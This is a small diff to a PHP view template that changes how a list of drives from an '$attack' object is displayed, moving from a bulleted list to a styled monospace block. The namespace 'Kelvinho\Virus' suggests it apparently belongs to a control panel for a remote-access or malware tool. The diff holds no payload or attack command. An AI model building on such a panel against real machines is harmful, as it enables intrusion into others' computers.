@@ -6,10 +6,6 @@ use function Kelvinho\Virus\map;
 
 ?>
 <p>The partitions/drives available are:</p>
-<ul>
-    <?php map($attack->getAvailableDrives(), function ($drive) { ?>
-        <li>
-            <pre><?php echo $drive ?>:/</pre>
-        </li>
-    <?php }); ?>
-</ul>
+<div style="background-color: var(--surface); font-family: monospace, monospace; padding: 1px 20px">
+    <?php echo implode(map($attack->getAvailableDrives(), fn($drive) => "<pre>$drive:/</pre>")); ?>
+</div>
